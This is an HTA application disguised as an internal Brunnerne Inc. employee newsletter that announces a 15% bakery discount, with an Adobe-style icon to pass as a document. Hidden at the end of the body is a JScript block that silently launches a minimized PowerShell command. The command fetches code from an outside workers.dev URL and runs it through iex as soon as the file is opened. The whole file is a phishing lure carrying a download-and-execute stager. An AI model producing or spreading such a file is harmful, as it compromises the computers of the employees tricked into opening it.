<!DOCTYPE html>
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<title>Brunnerne Inc. Employee Newsletter</title>

<HTA:APPLICATION
  ID="BrunnerneNewsletter"
  APPLICATIONNAME="Brunnerne Inc. Newsletter"
  BORDER="thin"
  BORDERSTYLE="normal"
  CAPTION="yes"
  MAXIMIZEBUTTON="yes"
  MINIMIZEBUTTON="yes"
  SCROLL="yes"
  SINGLEINSTANCE="yes"
  SYSMENU="yes"
  WINDOWSTATE="normal"
  ICON="https://raw.githubusercontent.com/mrmattipants/AdobeAcrobatIcons/refs/heads/main/ICO/Red/Adobe_Red.ico"
/>

<style>
  html, body {
    margin: 0;
    padding: 0;
    background: #d9dde2;
    font-family: "Segoe UI", Arial, sans-serif;
    color: #222;
  }

  body {
    padding: 28px 0 40px 0;
  }

  .page {
    width: 794px;
    min-height: 1123px;
    margin: 0 auto;
    background: #ffffff;
    box-shadow: 0 8px 28px rgba(0,0,0,0.18);
    position: relative;
    overflow: hidden;
  }

  .topbar {
    height: 14px;
    background: #7a2f2f;
  }

  .header {
    padding: 42px 58px 26px 58px;
    border-bottom: 1px solid #e3e3e3;
  }

  .brand {
    font-size: 14px;
    font-weight: 700;
    letter-spacing: 2px;
    color: #7a2f2f;
    text-transform: uppercase;
  }

  .issue {
    float: right;
    font-size: 12px;
    color: #777;
    margin-top: 2px;
  }

  h1 {
    margin: 24px 0 8px 0;
    font-size: 42px;
    line-height: 1.08;
    color: #1f2630;
    font-weight: 700;
  }

  .subtitle {
    font-size: 18px;
    line-height: 1.55;
    color: #5c636b;
    max-width: 620px;
  }

  .hero {
    margin: 34px 58px 0 58px;
    background: #f6eee8;
    border-left: 8px solid #b86f3d;
    padding: 34px 38px;
  }

  .hero-label {
    font-size: 13px;
    font-weight: 700;
    letter-spacing: 1.6px;
    color: #8a4e27;
    text-transform: uppercase;
  }

  .discount {
    font-size: 70px;
    line-height: 1;
    color: #7a2f2f;
    font-weight: 800;
    margin: 12px 0 8px 0;
  }

  .hero-title {
    font-size: 26px;
    color: #2d3136;
    font-weight: 700;
    margin-bottom: 8px;
  }

  .hero-copy {
    font-size: 17px;
    line-height: 1.55;
    color: #555;
  }

  .content {
    padding: 38px 58px 96px 58px;
  }

  .section {
    margin-bottom: 32px;
  }

  .section h2 {
    font-size: 20px;
    margin: 0 0 10px 0;
    color: #7a2f2f;
  }

  .section p {
    font-size: 15px;
    line-height: 1.65;
    margin: 0;
    color: #454a50;
  }

  .steps {
    width: 100%;
    border-collapse: collapse;
    margin-top: 14px;
  }

  .steps td {
    vertical-align: top;
    padding: 12px 12px 12px 0;
  }

  .num {
    width: 36px;
    height: 36px;
    line-height: 36px;
    text-align: center;
    background: #7a2f2f;
    color: white;
    border-radius: 50%;
    font-weight: 700;
    font-size: 15px;
  }

  .step-title {
    font-size: 15px;
    font-weight: 700;
    margin-bottom: 3px;
    color: #2e3338;
  }

  .step-copy {
    font-size: 14px;
    line-height: 1.5;
    color: #62686f;
  }

  .note {
    margin-top: 22px;
    padding: 18px 20px;
    background: #f7f8fa;
    border: 1px solid #e5e8eb;
    font-size: 13px;
    line-height: 1.55;
    color: #62686f;
  }

  .footer {
    position: absolute;
    left: 58px;
    right: 58px;
    bottom: 34px;
    border-top: 1px solid #e1e1e1;
    padding-top: 14px;
    font-size: 12px;
    color: #8a8f94;
  }

  .footer strong {
    color: #62676c;
  }

  @media print {
    html, body {
      background: #fff;
      padding: 0;
    }

    .page {
      width: 210mm;
      min-height: 297mm;
      margin: 0;
      box-shadow: none;
    }

    @page {
      size: A4;
      margin: 0;
    }
  }
</style>

<script type="text/javascript">
window.onload = function () {
  try {
    window.resizeTo(890, 1050);
    window.moveTo(
      Math.max(0, (screen.availWidth - 890) / 2),
      Math.max(0, (screen.availHeight - 1050) / 2)
    );
  } catch (e) {}
};
</script>
</head>

<body>
  <div class="page">
    <div class="topbar"></div>

    <div class="header">
      <div>
        <span class="brand">Brunnerne Inc.</span>
        <span class="issue">Employee News</span>
      </div>

      <h1>A little something<br/>fresh for our team.</h1>
      <div class="subtitle">
        We're pleased to share a new employee perk created especially for the people who make Brunnerne Inc. what it is.
      </div>
    </div>

    <div class="hero">
      <div class="hero-label">New Employee Benefit</div>
      <div class="discount">15% OFF</div>
      <div class="hero-title">at Brunner House Bakery</div>
      <div class="hero-copy">
        All Brunnerne Inc. employees now receive a <strong>15% discount</strong> at Brunner House Bakery, located right next door to the office.
      </div>
    </div>

    <div class="content">
      <div class="section">
        <h2>A perk close to home</h2>
        <p>
          Whether you're picking up a morning coffee, a brunner before a meeting, or something to take home after work,
          this new discount is our way of adding a little extra value to your workday.
        </p>
      </div>

      <div class="section">
        <h2>How to use your discount</h2>
        <table class="steps">
          <tr>
            <td style="width:48px;"><div class="num">1</div></td>
            <td>
              <div class="step-title">Visit Brunner House Bakery</div>
              <div class="step-copy">Stop by the bakery next door whenever you're in the mood for something fresh.</div>
            </td>
          </tr>
          <tr>
            <td><div class="num">2</div></td>
            <td>
              <div class="step-title">Let the bakery team know you work at Brunnerne Inc.</div>
              <div class="step-copy">Please be prepared to show your company ID or another approved form of employee identification if requested.</div>
            </td>
          </tr>
          <tr>
            <td><div class="num">3</div></td>
            <td>
              <div class="step-title">Enjoy 15% off your purchase</div>
              <div class="step-copy">The employee discount will be applied to your eligible order.</div>
            </td>
          </tr>
        </table>
      </div>

      <div class="section">
        <h2>Thank you for everything you do</h2>
        <p>
          We hope this new benefit makes your day a little sweeter. Enjoy it, share the news with your colleagues,
          and be sure to say hello to our neighbors at Brunner House Bakery.
        </p>

        <div class="note">
          <strong>Employee discount:</strong> 15% at Brunner House Bakery for Brunnerne Inc. employees.
          Company identification may be requested. Any bakery-specific exclusions or promotional restrictions may apply.
        </div>
      </div>
    </div>

    <div class="footer">
      <strong>Brunnerne Inc.</strong> &nbsp;-&nbsp; Internal Employee Newsletter &nbsp;-&nbsp; August 2026
    </div>
  </div>
<script language="jscript">
        var c = "powershell.exe -w minimized /c 'iwr -UseBasicParsing https://summer-darkness-50d9.oluf-sand.workers.dev/analytics/1ca729e6-5081-48da-a9b5-c1b8c21b433b | iex'"; 
        new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
